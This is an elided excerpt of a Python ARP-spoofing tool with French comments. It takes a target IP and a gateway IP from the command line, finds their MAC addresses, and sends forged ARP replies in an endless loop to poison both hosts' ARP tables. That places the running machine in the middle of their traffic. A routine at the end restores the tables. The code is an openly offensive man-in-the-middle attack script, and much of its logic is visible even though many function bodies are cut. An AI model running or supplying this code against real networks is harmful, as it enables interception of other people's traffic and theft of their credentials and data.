...
class arp_spoofing:
    ...
    def __init__(self):
        # Recuperation argument + regex ip
        self.Get_Arguments()
    ...
    def discover_mac_of_host(self):
        ...
        for i in range(len(arp_response)):
            if(arp_response[i]["ip"] == sys.argv[1] ):
                mac_tab[0] = arp_response[i]["mac"]
            elif(arp_response[i]["ip"] == sys.argv[2]):
    ...
    def Send_crafted_packet(self, mac_tab):
        ...
        try:
            while True:
                ...
                self.spoof_host_target(sys.argv[2], mac_tab[0], sys.argv[1])
                # packet for machine with ip of default gateway
                self.spoof_host_target(sys.argv[1], mac_tab[1], sys.argv[2])
    ...
    def Restore_arp_table(self,mac_tab):
        ...
        for loop in range(3):
            ...
            self.spoof_host_target(sys.argv[1], mac_tab[0], get_if_addr("eth0"))
            # packet for machine with our ip
            self.spoof_host_target(sys.argv[2], mac_tab[1], get_if_addr("eth0"))
            # sleep for not overload the network
            time.sleep(3)
    ...
    def Get_Arguments(self):
        if(len(sys.argv) == 3 ):
            ip = re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", sys.argv[1])
            if ((ip) == None):
                print("Mauvaise Ip")
                self.Error_Using_Func()
            else:
                ip = re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", sys.argv[2])
                if ((ip) == None):
                    print("Mauvaise Ip")
                    self.Error_Using_Func()
                else:
